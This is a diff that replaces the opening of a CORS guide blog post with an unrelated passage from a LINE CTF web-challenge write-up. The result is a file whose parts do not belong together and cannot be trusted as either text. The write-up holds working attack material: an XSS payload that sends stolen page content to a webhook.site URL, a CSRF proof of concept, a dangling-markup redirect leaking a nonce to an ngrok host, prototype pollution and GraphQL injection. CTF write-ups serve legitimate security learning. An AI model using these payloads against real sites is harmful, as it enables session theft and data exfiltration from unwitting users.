@@ -1,13 +1,270 @@
----
-title: "CORS Complete Guide (Part 2): How to Solve CORS Issues?"
-catalog: true
-date: 2021-02-19 00:17:13
-tags: [Ajax,JavaScript,Front-end,CORS]
-categories:
-  - Front-end
-photos: /img/cors-guide-2/cover-en.png
----
+Actually, `"` will also be encoded on the backend, so if you look at the source, you'll see `&#34;`. But if you use `document.body.innerHTML`, the browser may not encode it, so you'll see double quotes instead of `&#34;`. So, the encoding of double quotes doesn't work.
 
-## Introduction
+Then, the extension intervenes and replaces `rotate-1 yellow-bg"` with something like `***`, resulting in:
 
-In the previous article [CORS Complete Guide (Part 1): Why CORS Error Occurs?](/2021/02/19/en/cors-guide-1), we understood why the browser has a same-origin policy and that the blocked cross-origin request is actually the response, not the request. After clarifying some misconceptions and having a basic understanding of CORS, we can now talk about how to solve CORS issues.
+``` html
+<li>
+  <div class="xxx>
+    <p>" id=a x="</p>
+  </div>
+</li>
+<li>
+  <div class="xxx>
+    <p>LINECTF{xxx}</p>
+  </div>
+</li>
+```
+
+Adjusting the new structure a bit:
+
+``` html
+<li>
+  <div class="xxx><p>" id=a x="</p></div></li><li><div class=" xxx>
+    <p>LINECTF{xxx}</p>
+  </div>
+</li>
+```
+
+The first double quote is replaced, combined with the double quote at the beginning of the original content, and the `x="` at the end is combined with the next one. The `id=a` in the middle becomes part of the attribute.
+
+In other words, we can insert any attribute into the div and use the focus function to create an XSS. Here's the payload that Renwa gave me in Discord:
+
+```
+note 1:
+"tabindex="1"onfocus="eval(window.name)"style="position:relative;height: 20000px; width: 20008px;"autofocus="1"id="jj"x="
+
+note 2:
+LINECTF{rotate-1 yellow-bg"}
+
+Report:
+@domain.wtf/0ff.html
+
+Contents of 0ff.html:
+<!DOCTYPE html>
+<html>
+<body>
+<img src=http://httpstat.us/200?sleep=5000>
+<script>
+var x= window.open('http://web:3000/8be526fd-e193-436c-a431-84141a0903b9','fetch(`http://web:8000/`,{credentials: "same-origin"}).then(x=>x.text()).then(x=>fetch(`https://webhook.site/603ab026-5a65-432f-a894-5d981fd24198?flag=${btoa(x)}`))');
+setTimeout(function(){
+x.location='http://web:8000/8be526fd-e193-436c-a431-84141a0903b9#jj'
+},500)
+
+</script>
+
+
+</html>
+```
+
+I didn't think of this solution at the time. It's really amazing.
+
+## Another Secure Store Note (7 solves)
+
+This challenge had a feature to change the name, and the name would be directly reflected on the screen, creating a free XSS. However, the problem was that changing the name required checking the CSRF token. There was a file called `getSettings.js` that had the CSRF token:
+
+``` js
+function isInWindowContext() {
+  const tmp = self;
+  self = 1; // magic
+  const res = (this !== self);
+  self = tmp;
+  return res;
+}
+
+// Ensure it is in window context with correct domain only :)
+// Setting up variables and UI
+if (isInWindowContext() && document.domain === '<%= domain %>') {
+  const urlParams = new URLSearchParams(location.search);
+  try { document.getElementById('error').innerText = urlParams.get('error'); } catch (e) {}
+  try { document.getElementById('message').innerText = urlParams.get('message'); } catch (e) {}
+  try { document.getElementById('_csrf').value = '<%= csrf %>'; } catch (e) {}
+}
+```
+
+Here, it checks whether it is in the window context and `document.domain`. When I saw this, I immediately thought of the Intigriti XSS challenge in October 2022. The author's writeup is here: https://github.com/0xGodson/blogs/blob/master/_posts/2022-10-14-intigriti-oct-xss-challenge-author-writeup.md
+
+One part of the challenge uses a web worker to bypass the check on `window.location.href` and `document.domain`, like this:
+
+``` js
+// worker.js
+
+window = {}
+window.location = {}
+document = {}
+
+// send the secret to top window!
+window.saveSecret = function(msg){  
+  self.postMessage(msg)  
+}
+
+window.location.href = "https://challenge-1022.intigriti.io/challenge/create";
+document.domain = "challenge-1022.intigriti.io";
+
+// we can use importScripts function from API to import external scripts!
+importScripts("https://challenge-1022.intigriti.io/challenge/getSecret.js");
+```
+
+So this challenge specifically checks the context to try to block this, but fortunately when I was researching Intigriti, I found that `document.domain` can actually be overridden using `Object.defineProperty`, so CSRF can be done like this:
+
+``` html
+<script>
+  Object.defineProperty(document, 'domain', {
+    value: '35.200.57.143'
+  })
+</script>
+<input id="_csrf" />
+<script src="https://35.200.57.143:11004/getSettings.js"></script>
+<form id=f method=POST action="https://35.200.57.143:11004/profile" target="_blank">
+  <input name="name" value="poc">
+  <input name="csrf" value="">
+</form>
+
+<script>
+  const csrf = _csrf.value
+  f.csrf.value = csrf
+  f.submit()
+</script>
+```
+
+Next is to steal the nonce. This challenge uses Firefox, and it doesn't seem to have much protection against Dangling Markup Injection, which can be used to steal the following content using meta redirect: `<meta http-equiv=refresh content='0; url=http://43d1-ip.ngrok.io/steal?q=`
+
+The final step is to prevent the loading of `csp.gif`, because if this is loaded, the nonce will change. I spent an hour and a half trying to figure out how to block it, and originally thought that the previously mentioned concurrent limit could be used to prevent it, but no matter how I tried, it didn't work.
+
+Finally, I found that the original `base-uri` was `self`, so the base could be used, wasting an hour QQ
+
+## Momomomomemomemo (3 solves)
+
+This challenge was solved by my teammate and is quite interesting. Basically, the frontend will use GraphQL to fetch results based on the id you provide:
+
+``` js
+memo(id) {
+    const query = `query { 
+        memo (
+            id: "${id}", 
+            token: "${this.token}") {
+                content
+            } 
+        }`;
+    return this.#query(query);
+}
+```
+
+In the final query part, [persisted queries](https://www.apollographql.com/docs/apollo-server/performance/apq/) are used. Basically, you send the hash of the query first, and if it has been executed before, the result will be sent back directly.
+
+Otherwise, if it hasn't, you send the hash + query again, and the backend caches the result. The frontend implementation is like this:
+
+``` js
+async #query(query) {
+    const hash = await this.#getQueryHash(query);
+    const res = await fetch(
+        this.endpoint +
+            "?" +
+            new URLSearchParams({
+                extensions: JSON.stringify({
+                    persistedQuery: { version: 1, sha256Hash: hash },
+                }),
+            }),
+        {
+            headers: { "Content-type": "application/json" },
+        }
+    );
+    const data = await res.clone().json();
+    if (data.errors) {
+        if (data.errors[0].extensions.code == "PERSISTED_QUERY_NOT_FOUND") {
+            return await fetch(this.endpoint, {
+                method: "POST",
+                headers: { "Content-type": "application/json" },
+                body: JSON.stringify({
+                    query,
+                    extensions: {
+                        persistedQuery: {
+                            version: 1,
+                            sha256Hash: hash,
+                        },
+                    },
+                }),
+            });
+        }
+    }
+    return res;
+}
+```
+
+The frontend also uses the Purl library, so there is also prototype pollution that can be used, but what can be polluted in this challenge? The answer is in this section:
+
+``` js
+const purl = window.purl
+
+const memoId = purl().param('id')
+
+const gql = new GraphQL(location.origin)
+
+class GraphQL {
+    constructor(host, option = {}) {
+        this.endpoint = host + "/";
+        this.endpoint += option.path || "graphql";
+    }
+    // ...
+}
+```
+
+You can pollute the path, which can manipulate `option.path`, but what can be done with this? This is related to the backend's i18n logic, implemented as follows:
+
+``` js
+// simple i18n
+app.use(function (req, res, next) {
+    let origPath = req.originalUrl.split('?')[0]
+    let origParam = req.originalUrl.split('?')[1]
+    let langPath = 'en/'
+    
+  
+    if (origPath.match(/((\/en\/?)|(\/ja\/?))$/) || origPath.match(/^(\/static\/|\/graphql\/?|\/favicon.ico\/?)/)) {
+      next()
+    } else {
+      if (req.headers['accept-language'] && req.headers['accept-language'].split(',')[0] === 'ja') langPath = 'ja/'
+      res.redirect(origPath + (origPath.endsWith('/') ? '' : '/') + langPath + (origParam ? '?' + origParam : ''))
+    }
+  })
+```
+
+Note that `req.originalUrl` will only have the path part, so if it's like http://chall:11005/abc, the originalUrl will be `/abc`.
+
+With the path manipulated above, we can pollute the path to `/huli.tw/`, so the sent URL will be: `http://34.85.126.119:11005//huli.tw/?extensions=...`, and in the backend's redirect logic, it will finally be redirected to `//huli.tw/en/?extension=...`.
+
+This way, by using prototype pollution, the request can be redirected to our own server and the query string can be obtained.
+
+The goal of this challenge is to steal the admin's memo, but we don't know the admin memo id. What should we do?
+
+Take a closer look at this section:
+
+``` js
+memo(id) {
+    const query = `query { 
+        memo (
+            id: "${id}", 
+            token: "${this.token}") {
+                content
+            } 
+        }`;
+    return this.#query(query);
+}
+```
+
+We can carefully construct an id to achieve GraphQL injection, like this:
+
+``` js
+query { 
+  memo (
+    id: "a", token: "b"
+  ) { content }
+
+  memo2: memos(
+    token: "${this.token}") {
+        content
+    } 
+}
+```
+
+This turns into two queries. The original memo token becomes the memos token, allowing access to all admin notes.
+
+Therefore, the final solution is to send this modified query once to let the server store the result, then add prototype pollution to redirect the request to our server. This way, we can find out the hash and obtain the result.
